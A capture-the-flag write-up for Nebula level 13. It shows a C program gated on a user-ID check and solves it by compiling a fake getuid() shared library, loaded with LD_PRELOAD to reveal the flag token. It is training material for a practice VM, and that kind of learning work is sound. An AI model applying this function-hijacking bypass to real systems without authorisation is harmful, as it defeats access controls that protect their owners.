# Nebula - Level 13

### About ###

>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.
>
>To do this level, log in as the level13 account with the password level13 . Files for this level can be found in /home/flag13.

### Source code ###

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <string.h>

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
  int c;
  char token[256];

  if(getuid() != FAKEUID) {
    printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
    printf("The system administrators will be notified of this violation\n");
    exit(EXIT_FAILURE);
  }

  // snip, sorry :)

  printf("your token is %s\n", token);
  
}
```

### Solution ###

To solve this exercise, the function `getuid` can be overwritten to return `1000` everytime. It can be achieved with the `LD_PRELOAD` trick. `LD_PRELOAD` is used to load a shared object before any other library.

```c
int getuid()
{
  return 1000;
}
```

The fake `getuid` function is then compiled as a shared library.

```
level13@nebula:/home/flag13$ cp /home/flag13/flag13 /tmp/flag13
level13@nebula:/home/flag13$ gcc -shared libfake.c -o libfake.so
```

Finally, the flag can be displayed by loading the fake library with the executable `flag13`

```
level13@nebula:/tmp$ LD_PRELOAD=./libfake.so ./flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
```
